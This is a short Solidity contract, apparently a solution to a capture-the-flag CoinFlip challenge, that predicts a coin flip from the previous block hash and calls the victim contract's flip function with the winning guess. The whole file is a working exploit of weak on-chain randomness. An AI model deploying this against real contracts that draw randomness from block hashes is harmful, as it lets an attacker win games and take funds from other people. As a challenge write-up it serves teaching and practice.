// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}

contract AttackCoin {
  ICoinFlipChallenge public victim;

  constructor(address _victimAddress) {
    victim = ICoinFlipChallenge(_victimAddress);
  }
    
  function answer() external payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        victim.flip(side);
    }
  /* Occasionally, remix will throw an error signifying it can't estimate
  the gas needed to complete the tx and throws a revert. I've added a receive
  function to remedy that. Sending more ETH to the contrct solves the issue. 
  0.06 ETH should be enough to finish the challenge. */
  
  receive() external payable {}
}
